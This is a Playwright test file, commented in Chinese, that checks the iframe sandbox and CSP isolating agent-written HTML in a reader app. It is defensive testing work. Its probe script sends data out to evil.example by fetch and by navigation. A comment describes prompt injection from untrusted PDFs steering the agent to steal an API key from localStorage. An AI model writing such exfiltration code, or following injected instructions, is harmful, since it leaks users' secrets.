/** agent 直接写 HTML 给用户看 —— 这条链路在真浏览器里到底成不成立。
 *
 * 这是**唯一**能证明那套隔离真的生效的办法。纯函数测试只能证明常量和字符串
 * 是对的（sandbox 值里没有 allow-same-origin、CSP 里有 default-src 'none'），
 * 证明不了浏览器照着做了什么。
 *
 * 这个功能的两个死点（响应信封没拆、壳漏传回调）当初就是在「测试全绿」的情况下
 * 交付的 —— 测试和代码犯了同一个错。所以这里改成在浏览器里看结果。
 */
import test from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { readFileSync, existsSync } from "node:fs";
import { fileURLToPath } from "node:url";

import { BOARD_HTML_SANDBOX, withBoardHtmlCsp }
  from "../../src/features/reader/domain/board-html.ts";

const CSS_PATH = fileURLToPath(new URL("../../dist/css/reader.css", import.meta.url));
const require_ = createRequire(fileURLToPath(new URL("../../package.json", import.meta.url)));
const READER_HTML = fileURLToPath(new URL("../../reader.html", import.meta.url));

const wrap = (html) => `sandbox="${BOARD_HTML_SANDBOX}" srcdoc="${
  withBoardHtmlCsp(html).replace(/"/g, "&quot;")}"`;

async function withBrowser(t, fn) {
  let chromium;
  try { ({ chromium } = require_("playwright")); } catch { t.skip("没有 playwright"); return null; }
  const browser = await chromium.launch();
  try { return await fn(browser); } finally { await browser.close(); }
}

test("agent 写的 HTML 真的画得出来，而且是标准模式", { concurrency: 1 }, async (t) => {
  if (!existsSync(CSS_PATH)) { t.skip("dist/css/reader.css 还没构建"); return; }
  const out = await withBrowser(t, async (browser) => {
    const page = await (await browser.newContext()).newPage();
    await page.setContent(`<!doctype html><style>${readFileSync(CSS_PATH, "utf8")}</style>
      <div class="reader-react-root"><div class="reader-board-pane">
      <iframe class="reader-board-frame" ${wrap(`<!doctype html><meta charset="utf-8">
        <style>html{background:#fff;color:#111}</style><h1 id="t">图表</h1>
        <svg width="80" height="40"><rect width="20" height="30" fill="#4a7"></rect></svg>`)}></iframe>
      </div></div>`);
    await page.waitForTimeout(400);
    const f = page.frames().find((x) => x !== page.mainFrame());
    return f && f.evaluate(() => ({
      h1: document.querySelector("#t")?.textContent ?? null,
      svg: !!document.querySelector("svg rect"),
      mode: document.compatMode,
    }));
  });
  if (out === null) return;
  assert.ok(out, "iframe 根本没建起来");
  assert.equal(out.h1, "图表", "agent 的内容没画出来");
  assert.ok(out.svg, "SVG 没画出来 —— 图表类产物全废");
  // 标准模式。**注意这条不守 doctype** —— 实测 srcdoc 文档在 Chromium 里永远是
  // CSS1Compat，有没有 doctype、父页面什么模式都一样（四种组合都量过）。
  // 反证时把 doctype 拿掉，这条照样绿，那不是门禁失效，是「quirks mode」那个
  // 说法本来就不成立。留着它是为了万一将来换成 src= 指真实端点。
  assert.equal(out.mode, "CSS1Compat", "srcdoc 居然不是标准模式了，前提变了");
});

test("沙箱是真的：够不到 localStorage、够不到父页面、拿到的是不透明源",
  { concurrency: 1 }, async (t) => {
    const out = await withBrowser(t, async (browser) => {
      const page = await (await browser.newContext()).newPage();
      await page.setContent(`<!doctype html><html><head><title>宿主</title></head><body>
        <iframe ${wrap(`<!doctype html><script>
          const p = {};
          try { p.ls = localStorage.getItem("k"); } catch (e) { p.ls = "THREW"; }
          try { p.parent = String(parent.document.title); } catch (e) { p.parent = "THREW"; }
          p.origin = location.origin;
          document.title = JSON.stringify(p);
        </script>`)}></iframe>
        <script>localStorage.setItem("k","sk-SECRET");</script></body></html>`);
      await page.waitForTimeout(400);
      const f = page.frames().find((x) => x !== page.mainFrame());
      return f && JSON.parse(await f.evaluate(() => document.title));
    });
    if (out === null) return;
    // localStorage 里存着用户的 API Key（明文是有意的设计）。agent 读的是不受信的
    // PDF，一句提示注入就能让它写出任意脚本 —— 所以这几条必须在结构上不可能。
    assert.equal(out.ls, "THREW", "沙箱页面读到了 localStorage —— API Key 归它了");
    assert.equal(out.parent, "THREW", "沙箱页面够到了父页面 DOM");
    assert.equal(out.origin, "null", "不是不透明源 —— sandbox 八成加了 allow-same-origin");
  });

test("CSP 挡住取数据；导航目前挡不住（有文档级 CSP 之后这条会翻）",
  { concurrency: 1 }, async (t) => {
    const out = await withBrowser(t, async (browser) => {
      const page = await (await browser.newContext()).newPage();
      const tried = [];
      await page.route("**/*", (r) => {
        const u = r.request().url();
        if (u.includes("evil.example")) { tried.push(u); return r.abort(); }
        return r.continue();
      });
      await page.setContent(`<!doctype html><body><iframe ${wrap(`<!doctype html><p>x</p><script>
        try { fetch("https://evil.example/?f=1"); } catch (e) {}
        setTimeout(() => { location.href = "https://evil.example/?nav=1"; }, 80);
      </script>`)}></iframe></body>`);
      await page.waitForTimeout(800);
      return { fetch: tried.some((u) => u.includes("f=1")), nav: tried.some((u) => u.includes("nav=1")) };
    });
    if (out === null) return;

    assert.equal(out.fetch, false, "CSP 没挡住 fetch —— default-src 'none' 八成被改了");

    // **导航是已知缺口。** `default-src 'none'` 是 fetch 指令族，管不了文档自己的
    // 导航；能管住 iframe 导航的是**父页面**的 frame-src，而阅读页目前没有文档级
    // CSP。所以沙箱页面能把它看到的内容（= 不受信 PDF 的内容）送出去。
    //
    // 这条不写死「逃得出去」，而是按阅读页有没有 frame-src 分支 —— 补上之后
    // 它会自动要求导航也被挡住，不需要有人记得回来改。
    const readerHtml = existsSync(READER_HTML) ? readFileSync(READER_HTML, "utf8") : "";
    const hasFrameSrc = /Content-Security-Policy[\s\S]{0,400}frame-src/i.test(readerHtml);
    if (hasFrameSrc) {
      assert.equal(out.nav, false, "阅读页有 frame-src 了，导航就该被挡住");
    } else {
      assert.equal(out.nav, true,
        "导航居然被挡住了 —— 要么加了别的防线（那就把这条改成 false 并说明），"
        + "要么这个探针失效了");
    }
  });
